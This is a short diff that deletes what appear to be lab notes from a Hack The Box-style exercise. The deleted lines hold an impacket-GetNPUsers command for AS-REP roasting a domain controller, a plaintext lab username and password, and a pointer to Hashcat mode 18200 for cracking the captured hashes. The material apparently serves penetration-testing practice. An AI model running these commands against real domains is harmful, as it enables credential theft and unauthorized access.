@@ -1,3 +1,0 @@
-impacket-GetNPUsers -dc-ip 10.129.231.184 inlanefreight.htb/grace:Inlanefreight01! -request -outputfile hashes
-
-Hashcat 18200
